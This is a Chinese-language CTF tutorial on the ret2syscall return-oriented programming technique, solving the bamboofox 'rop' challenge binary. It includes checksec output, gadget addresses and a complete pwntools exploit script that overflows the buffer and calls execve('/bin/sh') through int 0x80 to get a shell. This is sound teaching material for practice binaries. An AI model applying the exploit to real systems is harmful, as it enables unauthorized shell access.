> 参考资料：[https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2syscall)
>
> [https://baijiahao.baidu.com/s?id=1665277270769279870&wfr=spider&for=pc](https://baijiahao.baidu.com/s?id=1665277270769279870&wfr=spider&for=pc)
>

# 1、含义
顾名思义，ret to syscall，就是**<font style="color:#F5222D;">调用系统函数</font>**<font style="color:#000000;">以达到getshell的</font>目的

在计算中，系统调用是一种编程方式，计算机程序从该程序中向执行其的操作系统内核请求服务。这可能包括与硬件相关的服务（例如，访问硬盘驱动器），创建和执行新进程以及与诸如进程调度之类的集成内核服务进行通信。系统调用提供了进程与操作系统之间的基本接口。

至于系统调用在其中充当什么角色，稍后再看，现在我们要做的是：让程序调用execve("/bin/sh",NULL,NULL)函数即可拿到shell 

# 2、步骤
调用此函数的具体的步骤是这样的：因为该**<font style="color:#F5222D;">程序是 32 位</font>**，所以：

+ **<font style="color:#F5222D;">eax 应该为 0xb</font>**
+ **<font style="color:#F5222D;">ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以</font>**
+ **<font style="color:#F5222D;">ecx 应该为 0 </font>**
+ **<font style="color:#F5222D;">edx 应该为 0 </font>**
+ **<font style="color:#F5222D;">最后再执行int 0x80触发中断即可执行execve()获取shell</font>**

系统在运行的时候会使用上面四个寄存器，所以那么上面内容我们可以写为int 0x80(eax,ebx,ecx,edx)。只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用。

> 使用前提，存在栈溢出
>

但是我们该怎么控制这些寄存器的值？

在我们最开始学习汇编函数的时候，我们最常用到的就是push，pop，ret指令，而这一次我们将使用pop和ret的组合来控制寄存器的值以及执行方向。例如：在一个栈上，**<font style="color:#F5222D;">假设栈顶的值为2，当我们pop eax,时，2就会存进eax寄存器</font>**。同样的，我们可以用同样的方法完成execve()函数参数的控制

```plain
pop eax# 系统调用号载入， execve为0xb
pop ebx# 第一个参数， /bin/sh的string
pop ecx# 第二个参数，0
pop edx# 第三个参数，0
```

这样寄存器的值可以控制了。然后使用gadgets让这一连串的pop命令顺序连接执行 ，最后使用的ret指令 ，进而控制程序执行流程。

> 简单的理解，gadgets就是程序中的小碎片，ret2syscall就是利用这些小碎片来拼成shell，使用int 0x80系统中断来执行execve()，从而达成控制系统的目的。
>

# 3、示例
> 附件下载：
>
> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall)
>

首先将文件下载下来，看一下文件的基本信息：

```powershell
root@kali:~/桌面/CTF# file rop
rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
root@kali:~/桌面/CTF# pwn checksec --file=rop
[*] '/root/\xe6\xa1\x8c\xe9\x9d\xa2/CTF/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
root@kali:~/桌面/CTF# 
```

32位程序，开了NX保护

> NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。栈溢出的核心就是通过局部变量覆盖返回地址，然后加入shellcode，NX策略是使栈区域的代码无法执行。
>
> **<font style="color:#F5222D;">当NX保护开启，就表示题目给了你全部</font>****<font style="color:#F5222D;">system（'/bin/sh'）</font>****<font style="color:#F5222D;">或部分</font>****<font style="color:#F5222D;">'/bin/sh'</font>****<font style="color:#F5222D;">，如果关闭，表示你需要自己去构造shellcode（ret2shellcode）</font>**
>

将文件直接扔到IDA中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596511472713-ba6353a4-6e40-40ab-bdd5-0b39c8fc0b4d.png)

既然开了NX保护，我们就不能使用**ret2shellcode**，没有system函数，也无法使用ret2text，那我们使用一种全新的方法：ret2syscall。

从IDA可以看到：程序仍然使用了gets函数，存在栈溢出的条件。

很容易测得我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell（开了NX保护，栈上的代码无法执行），所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。

在前面介绍过，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用execve(<font style="color:#0D904F;">"/bin/sh"</font>,<font style="color:#C2185B;">NULL</font>,<font style="color:#C2185B;">NULL</font>)系统调用来获取 shell。

其中，该**<font style="color:#F5222D;">程序是 32 位</font>**，所以我们需要使得

+ 系统调用号，即 eax 应该为 0xb
+ 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
+ 第二个参数，即 ecx 应该为 0
+ 第三个参数，即 edx 应该为 0

而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。具体寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具。

首先，我们来寻找控制 eax 的gadgets：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596511922865-e7e8c3e8-b417-4768-8071-adabdfa89891.png)

可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。

类似的，我们可以得到控制其它寄存器的 gadgets

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596512002458-e080604e-f4df-4f28-91db-ae3ef55c5904.png)

这里，我选择

> 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret    //这个可以直接控制其它三个寄存器。
>

此外，我们需要获得 /bin/sh 字符串对应的地址。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596512082050-4ae27918-0bef-4b07-a959-1d1a1cb494b9.png)

可以找到对应的地址，此外，还有 int 0x80 的地址，如下

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596512151344-7cc9a0d2-a546-4a7e-830d-12726b218c18.png)

同时，也找到对应的地址了。

下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。

> 参考资料：[https://blog.csdn.net/YL970302/article/details/89930425](https://blog.csdn.net/YL970302/article/details/89930425)
>
> 在Linux中，每个系统调用被赋予一个系统调用号。这样，通过独一无二的号就可以关联系统调用。当用户空间的进程执行一个系统调用的时候，这个系统调用号就用来指明到底是要执行哪个系统调用；进程不会提及系统调用的名称。
>

```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596514120671-7336f901-c7b8-4802-bec5-f09a21823ec4.png)

成功getshell

![](https://cdn.nlark.com/yuque/0/2020/jpeg/574026/1596514325017-e9bf40f6-f13b-4acb-b01c-ae38e1e71398.jpeg)

